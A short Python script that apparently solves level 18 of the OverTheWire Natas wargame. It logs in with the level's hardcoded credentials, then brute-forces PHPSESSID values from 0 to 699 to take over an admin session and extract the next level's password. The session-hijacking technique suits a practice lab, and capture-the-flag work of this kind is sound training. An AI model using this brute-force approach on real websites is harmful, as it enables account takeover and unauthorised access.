import re
import requests

level = 18
creds = ('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
url   = 'http://natas%s.natas.labs.overthewire.org/index.php' % level

session = requests.Session()
response = session.post(url,auth=creds)
data = response.text
formdata = {'username':'nimda','password':'admin'}

for i in range(0,700):

	baked_cookies = {"PHPSESSID":str(i)}
	response = session.post(url,auth=creds,data=formdata,cookies=baked_cookies)

	data = response.text
	if "You are an admin" in data:
		print(re.findall("Password: (.*)</pre>",data))


print("DONE")